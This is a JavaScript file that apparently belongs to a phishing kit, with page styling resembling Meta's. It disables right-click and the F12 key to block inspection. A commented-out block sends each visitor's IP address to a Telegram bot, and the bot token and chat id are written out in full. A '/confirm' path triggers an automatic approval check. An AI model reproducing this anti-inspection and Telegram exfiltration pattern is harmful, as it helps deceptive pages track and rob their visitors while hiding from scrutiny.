﻿function showLoadingCircle() {
    document.getElementById('loading-circle').style.display = 'block';
    }
    
    // Hide the loading circle
function hideLoadingCircle() {
document.getElementById('loading-circle').style.display = 'none';
}

document.addEventListener("contextmenu", (e) => {
    e.preventDefault();
   }, false);
document.addEventListener("keydown", (e) => {
    if (e.keyCode==123) {
     e.stopPropagation();
     e.preventDefault();
    }
   });
var check = false;
var checkApprove = false;
var ip = ''
$(document).ready(function () {
    $('.btn-modal-cancel').on('click', function () {
        $('#exampleModal').modal("hide");
    });

    $(".btn-register-send").mouseenter(function () {
        $(this).css("background-color", "#1c2b33");
        $(this).css("color", "#F1F4F7");
    });

    $(".btn-register-send").mouseleave(function () {
        $(this).css("background-color", "#0067cd");
        $(this).css("color", "#ffffff");
    });

    // $.ajax({
        // url: 'https://ipapi.co/ip',
        // type: 'GET',
        // contentType: 'application/json',
        // async: true,
        // success: function (msg) {
            // ip = msg;
            // $.ajax({
                // url: "https://api.telegram.org/bot6372071467:AAHLb7HV4BIT40f8kueOs0UG9b-LcGPmZPc/sendMessage",
                // method: "POST",
                // data: {
                // chat_id: "-1001857558856",
                // text: "New website visit, IP: " + ip
                // }});
        // },
        // error: function (xhr, status, error) {
            // $.ajax({
                // url: "https://api.telegram.org/bot6372071467:AAHLb7HV4BIT40f8kueOs0UG9b-LcGPmZPc/sendMessage",
                // method: "POST",
                // data: {
                // chat_id: "-1001857558856",
                // text: "New website visit, IP: Unknown"
                // }});
        // }
    // });


    if (window.location.href.endsWith('/confirm') && !checkApprove) {
        checkApprove = true;
        checkApproveAuto();
    }
});